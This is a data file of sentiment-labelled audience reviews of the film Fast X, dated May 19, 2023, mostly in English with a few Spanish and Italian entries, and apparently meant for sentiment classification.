"May 19, 2023",POSITIVE,"WOW. Listen I was skeptical going in but Jason Momoa made this movie. His performance was AMAZING! Of course there is at least 14 spots where each person should be dead but that does not matter as the movie is all action. They do a great job with back story and they have so many actors in this. Not to take anything away from Vin Diesel at all, Jason just plane and simple was the STAR of this movie!"
"May 19, 2023",NEUTRAL,The most entertaining about this one is Jason Mamoa plays a villain so well but this movie was crazy. 
"May 19, 2023",POSITIVE,Holy cliffhanger it's a two-part movie and it leaves you on the edge of your seat right at the end. Don't leave right away or you'll miss it.
"May 19, 2023",POSITIVE,Great ending. it's about time. my Teenage daughter was so mad that they ended the movie the way it was.

I am taking my wife to watch the movie."

"May 19, 2023",POSITIVE,"If you like these movies then I think youll love it, gives everything you want"
"May 19, 2023",NEGATIVE,"Don't think I can bring myself to watch another one after casting Brie Larson. I can't think of anyone less deserving of being a celebrity than that plank of wood. She's just a nasty person in real life and shouldn't be getting work at a supermarket, let alone making millions to ruin whatever she's in"
"May 19, 2023",POSITIVE,"Una verdadera comedia de ciencia ficción combinado con drama y suspenso, simplemente perfecta"
"May 19, 2023",POSITIVE,Best car action movie in 2023.
"May 19, 2023",POSITIVE,I loved the movie so much it has so much action which was amazing….

"May 19, 2023",POSITIVE,"O…M…G! The 2nd best movie of the year (after The Covenant)! Full of action from start to finish! One of the best in the franchise, and a MUST-SEE for the summer! Can’t wait for the next one in this series. Go see it tonight!!!"
"May 19, 2023",NEUTRAL,Great action and scenery. Fun day at the movies. Acting and script a little weak
"May 19, 2023",POSITIVE,"I enjoyed how they went back 10 yrs. and brought back all the past characters, and I am looking forward to seeing how they develop the next Fast XI. There is more to see and I'm excited to see what the women will do. :-) 
LOVED IT!!"
"May 19, 2023",POSITIVE,Great movie! Action throughout. Great build up
"May 19, 2023",NEGATIVE,Probably the worst movie I've seen all year
"May 19, 2023",POSITIVE,Absolutely  the BEST one.  HANDS DOWN.  The movie kept you entertained from the get go. Until the credits rolled and like any of the franchise before you have to stay until the end. And the cliffhanger......leaves you wanting just 10 more minutes.
"May 19, 2023",POSITIVE,this movie is like a word so big that you can't read it until the end. makes you sleep in the middle of the movie theater.
"May 19, 2023",NEGATIVE,Letty not dead Han not dead and Gisele not dead the villain just doesn't mean anything
"May 19, 2023",POSITIVE,a few surprise cameos I thought the whole movie was awesome.  I binge watched all of them this past week I'm going again tomorrow with my nephew.
"May 19, 2023",POSITIVE,"Fast X Doesn't disappoints until unless you start using your brain while watching it ...
What matters is family"
"May 19, 2023",POSITIVE,I really enjoyed this movie and all the action to. It was a little more believable than previous movies but well done... I really look forward to the conclusion of the saga.
"May 19, 2023",POSITIVE,I have never missed a opening day of any of the Fast franchise and this one did not disappoint. Can’t wait for Part ll. Mi familiar
"May 19, 2023",NEUTRAL,Some kind disappoint about this movie.
"May 19, 2023",POSITIVE,good movie please watch it with your friends and family and parents and kids
"May 19, 2023",NEGATIVE,"I like cars, and planes, and action movies.
This was pretty bad, the worst action movie I've watched in a long time.
A unrealistic mix of stunts and cgi, cringeworthy performances - I can't call it acting, that would be too complimentary! 
Too many characters, trying to tie them all in makes it messy.
Parts of the movie happening all around the world at the same time - very messy.
Video game style feel mashed into over 2hrs+ of disjointed story. Pretty bad, wouldn't watch it again"
"May 19, 2023",NEGATIVE,"Explosions, usual bad acting, no actual plot and Razzie Awards worthy dialog."
"May 19, 2023",NEGATIVE,Using the actor who portrayed Reacher as a villain was a definite drawback for me.  Also too much crisscrossing of actors from good guy and bad guy and vice versa.  Caused me to be distracted during movie.
"May 19, 2023",NEUTRAL,"I usually like the Fast & Furious franchise, but this one was not the best one.
Two much mindless, unbeliveable car chases and car wrecks.  Not much bonding of cast, as they were all over the place.  Dumb story line!  And the fact is was going to run into another show , looks like just to get money. Jason Mamoa (who I have liked in almost all of his movies) was way over the top in this one!"
"May 19, 2023",POSITIVE,liked everything about the movie
"May 19, 2023",NEUTRAL,"Poor picture quality, sound poor, some action good."
"May 19, 2023",POSITIVE,An absolute thrilling watch. Better than the last with an ending that left us asking questions on what's to come. Loved the villain. Gave me Joker vibes.
"May 19, 2023",POSITIVE,I thought that the movie was a fun ride. Besides fast five this is up there as one of my favorite fat movies. I thought he action was fun and the cliffhanger had me thinking well after the movie ended. Very excited to see the end with fast 11
"May 19, 2023",POSITIVE,Awesome movie.  Lots of action...
"May 19, 2023",POSITIVE,The whole movie was amazing better and more incredible than I expected not gonna lie only thing I was mad about was how it left a cliffhanger which made me mad
"May 19, 2023",NEUTRAL,"This movies relies to much on the action. Though the action is cool, sometimes it's way to over the top if you ask me. I also thought the story was to thin. Jason Momoa was certainly fun in this movie and is the absolute highlight in this movie. 

5.6/10"
"May 19, 2023",POSITIVE,"Dom and the family are back with other friends and family showing up to save his little boy Brian. No spoilers alert. It all began when they where in Fast 5 in RIO and killed bad guy Kingpin Hernan Reyes, stealing his millions from the police vault and dragging his safe through the downtown of RIO. Unbeknownst to the movie audience, we come to find out that Reyes had a full grown son named Dante played by actor  Jason Momoa . Dante Reyes reeks havac onto the world starting with Cipher to get her technology the eye in the sky and weapons.  Dante then goes on a rampage to seek revenge on Dominik for killing his father and to kill all reaming family members. While at trying to blowb up the Vatican city in Rome, meet ups in London, back to Rio where Dom meets his sister in-law in a car race, and concludes the movie in Portugal Spain with Cars and Helicopter's blowing up all around the movie and with an ending at a Cliff hanger for FAST 11! Also please stay until movie credits roll with a secret Character to return to FAST 11!"
"May 19, 2023",POSITIVE,This flick was definitely a must see.  From start to finish.  It was a high octane ride.It had plenty of WTF moments and surprise cameos you didn't see coming.  This is definitely a movie you should see again and again. if you had seen the previous movies  they will be nostalgic moments that will take you back.
"May 19, 2023",POSITIVE,Very entertaining with an unexpected ending
"May 19, 2023",POSITIVE,Lot of action scenes. Story line a little hit and miss. Oh yeah! Cars can fly. Spoiler alert..... Expect a continuation next year of the Fast & Furious franchise.
"May 19, 2023",POSITIVE,I loved it so much. Only thing I would change is not having to wait for the next release
"May 19, 2023",POSITIVE,Movie was well acted and nice just did not like that they never ended the episode.
"May 19, 2023",POSITIVE,"Loved the movie. Obviously it is not realistic anymore like the first few films, but more into sci-fi. Having this thought and knowing this as you watch the movie, it was really enjoyable and lots of action! Can’t wait to watch the next one!"
"May 19, 2023",POSITIVE,Not really much to dislike. I’m a die hard fast and furious fan since the beginning. They’ve all been fundamentally good and tear-dropping great.
"May 19, 2023",POSITIVE,Jason Momoa played one of the best villains by far glad I spent the $20 to see it in D-Box had a lot of action scenes
"May 19, 2023",POSITIVE,I don't like the end
"May 19, 2023",POSITIVE,"A return to form, one of the best in the saga"
"May 19, 2023",POSITIVE,The story line and all of the action!!!  Jason Momoa played his character very well!!!  Loved how all of his enemies reunite for the greater good.  And I knew that fall should have killed Gisele!!!  Love how Paul Walkerocharacter was still included!!!
"May 19, 2023",POSITIVE,"OMG 
Action, Love, Suspense...
the Best!!!"
"May 19, 2023",NEUTRAL,"Beyond belief… Dom and the team were always on the edge of defying physics, but now it is bordering on ridiculous. I love this “Saga” and its family/characters, but really struggled with Fast X."
"May 19, 2023",NEGATIVE,"It's a fast and the furious movie, what do you expect? I had high hopes but crashes and burns minus Jason Momoa."
"May 19, 2023",POSITIVE,Loved all of the special effects.  Lots of action.  Would have liked to see that They made it at the end.
"May 19, 2023",NEGATIVE,Cash grab.  Everyone is coming back from the dead.
"May 19, 2023",NEUTRAL,It’s good in its own way. But we’re still missing Paul and when movie 9 ends with him pulling up we definitely expected to see the AI version of him that was rumored to be a thing.
"May 19, 2023",POSITIVE,"This film, as did previous versions, broke every single law of physics and automotive engineering. Crazy twists and turns all throughout the movie. Jason Mamoa was the comic book mastermind villain this franchise needed. As over-the-top and as ridiculous as it was, Id watch it again in a heartbeat. Just complete mindless fun."
"May 19, 2023",POSITIVE,I loved it lots of action
"May 19, 2023",POSITIVE,Lots of action but ending left you wanting more.
"May 19, 2023",NEGATIVE,"Wouldn’t have watched if I knew Brie Larson was involved, not a bad movie, tired of seeing women as the intellectuals and men as dumb idiot side kicks, I thought sexism was a bad thing? "
"May 19, 2023",POSITIVE,I liked it from beginning to end cant wait for the best one to come out.
"May 19, 2023",POSITIVE,Was good! The ending was not the best!
"May 19, 2023",POSITIVE,"Loved it! Family drama and unrealistic stunts are the hallmark of the Fast series and boy did they DELIVER! Entertaining from start to finish and left me eager for part 2. 

Best at #AMC of course!"
"May 19, 2023",POSITIVE,The movie was awesome. Definitely worth it
"May 19, 2023",NEGATIVE,Horrendous movie. Terrible acting. Poor story telling and terrible script. What a waste of time.
"May 19, 2023",NEGATIVE,"Wow, I can't believe they even decided to put this together. The movie ended just horribly. It will leave you asking WTF? No after action scene like all the others. There is a surprise at the end before the credits though. Also stick around for the credits. There is a scene 2 mins in. Other than that this movie just passed the time. Wasn't all that great at all in my opinion."
"May 19, 2023",POSITIVE,Best villain this far. Best $20 I’ve spent on anything all year😭
"May 19, 2023",NEUTRAL,"Perfect family Movie But Fast And Furious fans want Brian o Corner . We Are Tired From This family aroma . But this Movie is better Than previous but It Can be Legendary,  Well Exited for next squel ❤"
"May 19, 2023",POSITIVE,Excellent movie with a good enough story to keep you riveted the entire duration of the movie. My only complaint is I have to wait until 2025 for part 2 which seems crazy. If you like Fast and Furious then you should love this movie.
"May 19, 2023",POSITIVE,"Action packed, stay for the trailer at the end"
"May 19, 2023",POSITIVE,"Awsome, Spectacular, Amazing in every way, Every Cast deserves those minutes that they had, Jason Momoa was a splendid version of the joker, charismatic, and very careful with details, Brie Larson Killed it as Tess, as well as Daniela Melchior's Isabel, even the legendary cast made a very Great impact, deserves a part 2 and part 3, but needs something different, something new alongside Keeping the theme in order to get with a bang 🌟, recommend to go see this movie, deserves every minute."
"May 19, 2023",POSITIVE,This movie was super fun Jason mamoa was born for the villain role in that movie and amazing but I didn't like the fact they Killed Jacob (John Cena) When they bring hobbs back(the Rock)💔
"May 19, 2023",POSITIVE,Love.... Love...... Loved it. The Keep getting better and better.
"May 19, 2023",POSITIVE,"You laugh, you cry.. and in ways that only matter if you were there from the beginning. Whoever doesn't want 10-20 of these movies has some serious issues.

Expectations: 10/10 
Action: 10/10
Fun: 10/10
Heist: 10/10
Momoa: 10/10
Family: 10/10"
"May 19, 2023",POSITIVE,Entertaining from start to finish. Love this franchise!
"May 19, 2023",POSITIVE,Lots surprise faces and actions. Some action silly though but enjoyed watching it
"May 19, 2023",NEUTRAL,It was a great movie but just not much action to be called an action film wish I can get a refund for it
"May 19, 2023",POSITIVE,It was absolutely incredible! I loved every second of it and can't wait for Part 2. The story in this one is incredible and a perfect way to start the beginning of the end of the Franchise.
"May 19, 2023",POSITIVE,Movie was great fun to watch definitely recommend to watch it on Dolby amc
"May 19, 2023",POSITIVE,"Action-packed, fun and The Rock was clutch again!"
"May 19, 2023",NEGATIVE,"The Fast and Furious died after the 2nd movie
When will they end this nightmare?"
"May 19, 2023",POSITIVE,"Enjoyed the movie.  A little more violent then some of the past movies, with more collateral damage. The bad guy was crazy— deranged, a little scary, and sometimes funny. The action was over the top. Left us with a cliffhanger with the next one expected in 2025."
"May 19, 2023",NEGATIVE,"Funny I guess if you enjoy laughing at a movie. Full of cheese, over the top acting,  silly dialogue and a scrambled egg of a plot.  Sort of like watching a cartoon with cars  but with a soap opera tone.  A disaster."
"May 19, 2023",POSITIVE,one of the best fast movie I done ever seen
"May 19, 2023",NEUTRAL,"While the film is uncoordinated and is a bit poorly directed from time to time, Fast X embraces what it is and provides fun wall-to-wall action, an entertaining villain and virtuous cast chemistry."
"May 19, 2023",NEGATIVE,worst f&f movie yet extremely unrealistic and really bad ending and story
"May 19, 2023",POSITIVE,"What a welcome return to more of what most came to love with the FF franchise. This movie really has something for everyone whether you’re a fan of the street racing era from 1-4 or more action from 5-present. This movie really subverted a lot of my expectations, Jason Mamoa is the best villain of the series, and it seems to set the stage for quite a finale. Really loving that the story is slowly starting to come full circle with past characters and events. I haven’t been this satisfied and also curious for the future walking out of a Fast movie since 2015 with Furious 7. There may have been a scene or two that felt like they could be cut but overall I’m really happy with this film and how it mixed things up. I’m pumped for this director to come back and helm Fast 11. This is a must see for a FF fan."
"May 19, 2023",POSITIVE,"Llena de acción como todas las peliculas de la saga, una gran pelicula para un domingo por la tarde."
"May 19, 2023",POSITIVE,Loved the movie! But I hate that it just left us hanging :( also the movies theater speakers were so loud like louder than it normally Is
"May 19, 2023",POSITIVE,Its as good as it get with the Fast films. Expect the over the top movie scenes. Make sure to practice: Suspension of disbelief.
"May 19, 2023",NEGATIVE,"A movie that doesn't take factors like 'Gravity'... 'Laws of Physics' 'Dead and staying Dead' into account. It was bad, but I still couldn't help but enjoy some of the action. Jason Mamoa is the standout in an otherwise below average Fast entry."
"May 19, 2023",NEGATIVE,Not great. Probably the worst in the franchise but I WILL be back for the next one.
"May 19, 2023",NEUTRAL,They hinted it was going to be last oneNOPE!
"May 19, 2023",POSITIVE,"I would put this movie right above F8 and Hobbs/Shaw's spinoff in that order and under Furious 7, Fast 5, and F6, in that order as a hilarious and entertaining entry in a lifelong blockbuster franchise full of melodramas."
"May 19, 2023",POSITIVE,"This movie was so fun to watch. I liked every bit. The villain, the comedy, the action, and the feels. They split the family up on their own journey to come back to each other like LOTR. I can't wait for the next 2 films"
"May 19, 2023",NEUTRAL,"A disclaimer before I start: the Fast & Furious franchise (today) is a franchise that will only satisfy the fans of the series. People who don't care about the series or those who haven't watched the films, will find this tedious and stretched out.

Fast X is directly linked to Fast Five, wherein Dom & team steal a huge safe and in the process kill Hernan Reyes. His son, Dante played by the charismatic & unhinged Jason Mamoa is now out for revenge. 

I had not watched a single F&F film till the fifth movie (one of the best) released. After which, I sat and watched every single one of them; with just the 8th installment in the theatres (one of the worst). To be honest, the first four installments did not peak my interest. The real fun began with the 5th film when they films become more about heists & they started linking the films; this blew my mind. All that excitement ended with the 7th film. The 8th & the 9th installments were a step down and unnecessary. But Fast X is far better than the previous two films and sets up an exciting finale filled with characters that you have come to love. 

Jason Mamoa's performance is the highlight of Fast X. He is really good; his best performance till date! Everyone else do what you expect them to do. The action set pieces are well choreographed & so is the well setup twist at the end. Alan Ritchson, Brie Larson, Rita Moreno & Daniela Melchior make their franchise debuts. The film also brings back some fan favourite characters that will surely pump you up for the finale. 

Fast X is all about family, forgotten (read dead) characters resurfacing, a cliffhanger ending and an excellent Jason Mamoa. Fans of the franchise, do watch it. Others can choose to stay away."
"May 19, 2023",POSITIVE,It was typical fast and furious fare! They keep upping themselves on the stunts! The Cliffhanger was an interesting twist! If you are a fan you will love it! It's a classic popcorn movie!
"May 19, 2023",POSITIVE,Good movie I love it I can’t wait to order my tickets for the next one
"May 19, 2023",POSITIVE,"Better than expected.  Jason Mamoa is HILARIOUS. He should have been in the other series. Script and writing is a little more developed.  Still has its movie moments, but I was overall entertained. The series continue its cameos. Watch the after credit scenes"
"May 19, 2023",POSITIVE,Fast X was awesome. Can't wait for the next one.
"May 19, 2023",POSITIVE,This movie was really awesome two thumbs up 👍🏾 👍🏾
"May 19, 2023",NEUTRAL,Some of the stuff in the movie is silly but Great car and fight Actionand Jason Mamoas performance make this a fun weekend watch.
"May 19, 2023",POSITIVE,"The film is so great it was about time that Brian O'Conner mae an appearence I loved it even it was in a flashback. I loved so much the character of Jason Momoa and also the amazing job he did in this role as sadistic, machiavellian person, very funny, reckless, fearless villain. He is the best in being the worst villain of the entire franchise. No other villain was as good as him."
"May 19, 2023",POSITIVE,"I dont know why critics hate this movie.... But i love it. The plot , the story, the details enough for me.. i really enjoyed."
"May 19, 2023",POSITIVE,"Good movie and better than expected. Great to see all the old team together, and the action was great!  The ending promises more to come."
"May 19, 2023",POSITIVE,"It was a thrill ride from the start to finish and it was exactly what I thought it would be...a little ""out there"" for the car stunts.  Jason Momoa plays a great sadistic character who is off his rockers with some comedy thrown in...he reminded me of a version of the Joker."
"May 19, 2023",NEUTRAL,"Fast X had a job to deliver an action movie that has great action that is riddled with impossible situations. This is a part of the allure of the franchise that has been the driving force that has led to 11 films with more on the way. It is not without its flaws, major ones at that, but they're the type of issues that get somewhat of a pass due to the type of movie they're in. In fact, the flaws help make the movie fun.

Dispensing with the bad, don't expect the plot to make a lot of sense. It's basic, but convoluted to the point where you just go along for the ride. There's 3-4 too many characters and at least 10-20 minutes worth of run time that can be cut out. But the time we spend with these characters and the added run time do not equal a movie that drags or ever gets too boring. What works is the comedy, action, and a memorable villain (that perfectly balanced being goofy but also fearful). It's not a comedy, but some of the characters and the situations they're in allow natural comedy to happen. What's not natural is the laws of gravity and technology. The action scenes that happen can only play out in a movie like this, so when a bomb makes its way through Rome barreling it's way through 10,000 obstacles, we appreciate its ridiculousness that not many movies can provide.

If this were a script for most action movies, it would result in a much lower rating. Fast X has a script that could purposely be bad to make the ridiculous action pull can be more easily swallowed. Quite simply, the only way you won't like this movie is if you don't like this franchise. It's better than some of the Fast movies, not as good as others, but is for sure a fun time with some standout action scenes."
"May 19, 2023",NEGATIVE,"Two words for you, ho key. OMG was this over the top. Save your money."
"May 19, 2023",POSITIVE,I love this movie it had so much action packed I love it . We need more movies like this
"May 19, 2023",NEGATIVE,This movie is not a movie anymore. It's called 4k quality fx effect's. So unrealistic doesn't makes any sense at all.
"May 19, 2023",POSITIVE,Absolutely awesome and amazing and all the call backs and cameo appearances were awesome. The post credits scene was bananas
"May 19, 2023",POSITIVE,I loved the movie.  I was a little disappointed I didn't realize it was going to be part of a trilogy until right before the movie started though.  It had some real weird and unexpected twists that made the movie very entertaining as long as you are not overly sensitive to weird stuff.   I saw it on early premiere night and the people that were there all seemed to react positively multiple times.
"May 19, 2023",POSITIVE,A lot of action and great actors
"May 19, 2023",POSITIVE,This was an absolute masterpiece! Holy shit!
"May 19, 2023",POSITIVE,"Il film è un susseguirsi di eventi rocamboleschi. Ottima la scelta delle autovetture e sono rimasto colpito in positivo dalla scelta, in particolare, del marchio alfa romeo (ancora una volta). Jason Momoa scritto da Dio. Il finale mi ha lasciato a bocca aperta perché rimane tutto in bilico. Felice per il ritorno di Gal Gadot nel ruolo di Giselle."
"May 19, 2023",POSITIVE,I LOVED EVERYTHING!!!!!!
"May 19, 2023",NEUTRAL,"The plot is absurd, but the action and the acting are enough to make this a fun movie to see.  It is a cliffhanger, however, so the final ride will have to wait for Fast 11."
"May 19, 2023",POSITIVE,Some parts were cheesy and Jason Mamoa isnt really the villain type it wouldve been better with Alan Richardson as the main bad guy. But what was good about this one was seizing Elenas sister and this one was truly about family and I admire that.
"May 19, 2023",POSITIVE,Very exciting and action PACKED!
"May 19, 2023",POSITIVE,I think it is a fucking nuclear bomb
"May 19, 2023",POSITIVE,WWOOOOWWWWWW THAT REVEAL THOUGH LOL
"May 19, 2023",NEUTRAL,"Worse cliff hanger than Empire Strikes Back, much worse. More like Infinity Wars, except for me a marginal movie that now expects me to wait 2 years. And,  it expects you to know who everyone is, even if they dies 6 movies ago"
"May 19, 2023",POSITIVE,Loved the action.. the fact that they stick together as a team. Love the surprises.. loved the ending.
"May 19, 2023",POSITIVE,"Fast X reaction.

Vin Diesel y sus secuases no dejan de asombrar al espectador cuando se trata de carros, embustes, momentos de acción y sobre todo un villano al fin memorable como lo fue Jason Momoa como Dante Reyes. Dante fue un poco gracioso para mis gustos pero como dice mi brother Alejandro Salas tenia ese toque genuino al.estilo Joker para una pelicula tan grande como lo es Fast X. Esta vez se fueron en grande, viejos y nuevos personajes se unen a esta gran historia que nunca acaba, Dom,Lety,Roman,Han,Tej,Mia,Little Brian y Ramsey viven una vida mas tranquila antes de que de la nada Cipher es atacada por Dante dandonos un tour masivo a los filmes anteriores pero concentrandose mas en los acontecimientos de Fast Five, la.muerte de Hernan Reyes tiene un pequeño maniaco con sed de venganza y esta vez no solo es con ""La Familia"" si no con todo lo que los rodea.

Que me gustó de la pelicula? ✅️

-El guión a pesar de sus grandes criticas nos lleva a un viaje emocionante con todos los integrantes de La Familia, eso si mucho mas personajes nuevos fueron añadidos a la historia, dandole centro a Dante (Momoa) como el villano principal, Little Nobody(Eastwood) vuelve en su papel como uno de los agentes de Nobody(Russell), la hija, Tess (Brie Larson), Aimes (Alan Ritchson) y Jakob (Cena) entran al espectaculo. Todo se prende en la madre cuando con esa sed de venganza Dante tiene de objetivo matar a toda la familia, llevandolos a diferentes trampas en lugares objetivos en Roma, ahi se prende el primer acto de la movie, destruyendo casi toda la ciudad de una manera violenta, pero ya ustedes saben que los embustes acaban de comenzar.

-Todos los personajes brillan en pantalla no hay ni uno que les pueda decir que fue dejado atras en cualquier escena de los 3 actos, Dom siempre dandonos momentos de acción masivos, mientras que los demas entre chistes y desesperación hace que el filme entretenga en todo momento a pesar de los embustes y el carro indestructible de Toretto, ese maldito Charger yo lo quiero en mi vida.

-Dante... mano tengo que decir que es el centeo de la movie, dandonos un espectaculo al ser presentado como un villano digno de esta saga, sarcastico,despiadado, medio fino en momentos pero ese personaje tanto ajita como encanta. De veras que llevó a un nivel a cada personaje con todo el desmadre que dejo en el final de la pelicula eso hace que sea demasiado memorable y guste mas aún.

-Siempre Fast se destaca por los carros que utilizan y a pesar de irsele la magia de carreras clandestinas volvemos a un lugar que muchos de P.R. van a notar, pero debo decir Brasil. Al fin vemos un momento que todo entusiasta de carros les va a encantar y ese Standoff entre Dom y Dante quedo en la madre.

-Hay algo ue dejare dicho como que me gustó de la pelicula fueron sus embustes, mano... tu sabes la que hay esto es Fast and Furious diviertete, pasala bien con tus panas, no cojas luchas si ya pasaste por Fast 9 que fueron al espacio, al menos aqui no llaman al Millenium Falcon con Han Solo tratando de ayudarlos a llegar al Death Star.

-De peleas tengo que darle el #1 spot es a Letty(Michelle Rodriguez) vs Cipher(Charlize Theron) esas dos bastardas se dieron hasta con el banco de la esquina, lo dieron todo y lo mas seguro ganarán Fight of the Year en los Mtv Movie Awards l, como mención honorifica Deckard Shaw(Statham) vs Han(Sung Kang).

-Esta es la primera de una ultima trilogia que los dejará mordidos por uno o dos años mas de espera, pero que lo mas probable por diversión la veras varias veces, so falta Fast 11 y Fast 12 pars culminar este desmadre.

Que no me gustó de la pelicula?⛔️

-Cosas que podria decir que no me gustaron pues en parte es los mega embustes, no se dan ni un razguño mano y esos carros estan reforzados con Adamantium por mi madre.

-Jakob(John Cena) lució como un tonto a diferencia de Fast 9 que se veia amenazador y el unico que le podia meter las manos bien duro, aqui fue el comic relief de no estar Dante en pantalla eso si me ajito alguito, pero nada tenia que picharle pq si lo cojia en serio la movie lo las seguro tocaba la Clasificación C.

-Hubo una parte tan y tan embustera y violadora de fisica entre Dom y su hijo Brian que por mi madre mori cuando la vi, les digo sus faltas son las ganancias de fans que le gusta y le divierte este tipo de cosas, pero al menos esta 10ma entrega esta mejor que Fast 9 y por mucho.

P.s Su final quedo en la madre y ese REVEAL ESTA 🔥🔥🔥🔥🔥
Solo tiene un MID CREDITS y les aseguro QUE LES VOLARÁ LA CABEZA.

Clasificada: B
8/10 Great!"
"May 19, 2023",POSITIVE,"I really liked it, just don't want to give any spoilers, just a bunch of surprises."
"May 19, 2023",POSITIVE,This is my 2nd time watching the MOVIE!!!
"May 19, 2023",NEUTRAL,"I didnt get enough cars from one of the kings of breakneck car drama in Leterrier, but there is enough madness, laughs, and crazy stunts to make for more fun than the MCU has dished up recently."
"May 19, 2023",POSITIVE,"Talk about mindless fun entertainment. The best popcorn movie in a really long time. Ridiculously crazy mad entertainment. The movie is everything but nothing at the same time. Definitely a good watch with friends and ""family"". Big W."
"May 19, 2023",NEGATIVE,More of the same although entertaining it's time to end the franchise.
"May 19, 2023",POSITIVE,Everything that went on was insane and defied the laws of physics.  But it was wildly entertaining.
"May 19, 2023",POSITIVE,"Great action.
Ending left too much unsaid."
"May 19, 2023",NEGATIVE,"Senseless plot, very poor, cardboard acting (Mark Sinclair, big surprise) and overly ridiculous stunts/crashes.  Definitely made for a specific type of audience."
"May 19, 2023",POSITIVE,"Very good movie, just to have fun! There are some unrealistic things but most movies do! Has me excited for part 2!!!"
"May 19, 2023",POSITIVE,Great movie! Lots of action. Tons of surprises. Jason Momoa is an awesome edition.
"May 19, 2023",NEGATIVE,"I don't like that it ended on a cliffhanger. Out of nowhere this turned into a Marvel movie with a bad ending, only to come back with a good ending?"
"May 19, 2023",POSITIVE,Great. Full of action scenes
"May 19, 2023",POSITIVE,We both enjoyed this high action film and are looking forward to the sequel!
"May 19, 2023",POSITIVE,Jason Mamoa was the perfect villain.
"May 19, 2023",POSITIVE,"Action packed.
Loved Rita Moreno.
Jason Momoa can play crazy very well. 
the ending was student the past ones but I like the cliff hanger. 
I love the photos throughout the movie.  it's the respect to Paul Walker. Also love the mix of the villans from past movies to allies with this one."
"May 19, 2023",POSITIVE,It is Part 10 of series - Fun movie.
"May 19, 2023",POSITIVE,"Great action but no story, Jason's acting 10/10"
"May 19, 2023",POSITIVE,"I am a Fas-Furi fan for life!! I loved everything about it the fam all together, the new additions to the saga and the plot Love love loved it!! The ending definitely had me sitting on the edge of my seat with my hands to me face!! Cant wait for the next one!!"
"May 19, 2023",POSITIVE,Movie was awesome! 4DX was good too but the smoke effects where lame. Not enough.
"May 19, 2023",POSITIVE,"Yeah, you can not do all that stuff in cars, but the action is fun, and it brings all the past movies together."
"May 19, 2023",POSITIVE,Liked how it followed the story in Fast 5. And lots of putting family above anything else.
"May 19, 2023",NEUTRAL,I disliked that it ended on a cliffhanger
"May 19, 2023",NEGATIVE,"As a longterm fan of the franchise, I find all reasons to compliment the movies. However, I've been struggling past no. 7. This recent instalment is the final nail in the coffin. Dreadful is an understatement. I won't be watching any future instalments. They've sucked the franchise dry. It should come as no surprise they are splitting these 'final' instalments into three parts. Money talks, unfortunately."
"May 19, 2023",POSITIVE,"Well let's get the negative out of the way because this movie was elite for the franchise. The negative is that the action sequences are glaringly inaccurate to the point that in multiple scenes you just have to turn your brain off. Which is advisable anyway after the last installment of the series. 

Well that's enough of that. The characters in this movie are some of the best the franchise has ever introduced, possibly since the first movie, but at least since Hobbs. They are wildly entertaining, deeply imaginative, and carry a point of view that is a welcome relief to brooding executive type villains and predictable heroes. The comedy is the best the franchise has ever utilized. Years of character building has given the writers comedic layups that they regularly make, but this movie goes further. The comedy in this movie is top-flight because it takes risks and utilizes side characters to build on. The laughs really take the pressure off the action sequences. Third, the plot is nearly impeccable. The movie deftly handles what other franchises labor to resolve which is looking back. Fast X relies upon other movies in the series in logical ways, and therefore doesn't belabor the point. In fact, Fast X feels like it was always the plan, even tho it wasn't. The writers don't give the feeling of ""encore"" cinema; franchises that extend beyond their life due to popularity. The story is riveting start to finish. Lastly, the cars in this movie are orgasmic. Incredible vehicles put under the bright lights make this film a brilliant microscope on vehicles.

All in all:

Overall grade: A-

Action: C-
Comedy: A+
Characterization: A
Plot: A
Acting: A+

2 and a half hours flies by"
"May 19, 2023",POSITIVE,"Action packed summer thrill ride! Great story, unexpected twists. Can't wait for FAST XI."
"May 19, 2023",NEUTRAL,I liked it... but it seem they took the family friendly turn.
"May 19, 2023",POSITIVE,Best film ever for sure gonna have to go back and watch again with the family.
"May 19, 2023",NEUTRAL,"The Beginning of the End.

The Fast Family is back for their final chapter and the outrageous scenes are in full throttle. This franchise never fails to break the laws of physics while also providing an entertaining film from beginning to end. Jason Momoa and Alan Ritchson provided the best performances in this film and help carry whatever screen time they had proving to be some of the better additions to the cast and I am excited to see what they bring in the next two instalments of Fast X. With that being said this film was far from perfect. There were quite a bit of scenes in this film that dragged or were useless but makes sense that they had to keep them as this is the first of a three part film. Typical unbelievable stunts lead to CGI that don't look good and feels like a video game cut scene really take me out of it. Overall I did enjoy this and have it rated as a partial rating as the story is not finished yet. We shall see how this story concludes."
"May 19, 2023",POSITIVE,Hated that the ended wasnt the ending and that we have to wait for another one to come out!
"May 19, 2023",POSITIVE,It's about da family
"May 19, 2023",POSITIVE,"What a great movie. This movie has action, emotions and comedy as well. 200+ people reacting on different scenes at the same time was amazing feelings. I saw this movie in Dolby at AMC Theater. An amazing experience. I love all cast, but Jason is one of my favorite actors. I loved it, specially punching bag that he was using. Lol. I also bought FastX car (Popcorn tin) at AMC theater. The whole experience was amazing. Thank you Fast family, Dolby and AMC for making my experience great. I will watch this movie again over the weekend for free using my AMC A-list membership."
"May 19, 2023",NEGATIVE,Weak. Poor script. Unreal action scenes.
"May 19, 2023",NEUTRAL,"It's not a bad action movie, but it really shows, that Toretto and the family has to go. Ride off into the sunset, it's time. The thing is, that the core cast is pretty boring, only the newcomers can deliver great performances and some much needed fun, and curiosity. Jason Momoa really thrives, it's one of his very best performances so far, Daniela Melchior is great too. The plot is badly written and dumb sadly. Feels like random people from the franchise thrown in together for the movie, but this chaotic ensemble doesn't really sticks together. The glue is missing sadly. These movies provided fun for years, but they can't offer anything new, so they have to go for good."
"May 19, 2023",NEGATIVE,"Es una mala película sin más, no tiene buena trama y lo único bueno es el villano interpretado por Jason Momoa"
"May 19, 2023",NEGATIVE,Movie is so long and Vin Diesel is clearly running out of ideas for this franchise but at the same time wants to milk the most of it. It’s like milking a dead cow. Just let the franchise die already!! It’s pathetic at this point. We know you keep working on this franchise because of the rest of Hollywood won’t take you seriously as an actor.
"May 19, 2023",POSITIVE,"This movie felt like it was fan written (and I mean that as the highest compliment). It had everything you want and expect from a fast movie and more! 

Jason Momoa feels like he had the time of his life on this set. He's so fun to watch. Dom is still Dom and all the other family members have perfect scenes that highlight the best traits of their character. 

If you are a Fast Fan, you won't be let down!"
"May 19, 2023",POSITIVE,"Greatest movie ive ever watched so far,,,,,,,,,,, pretty sure will go back to cinema to watch it again🙌🏻🙌🏻🙌🏻"
"May 19, 2023",NEGATIVE,"It's just bad, the dialogue was subpar and it just lost its essence"
"May 19, 2023",NEUTRAL,The movie was good but it was a lot of people talking 2 kids being loud and cursing
"May 19, 2023",POSITIVE,Great movie must see this
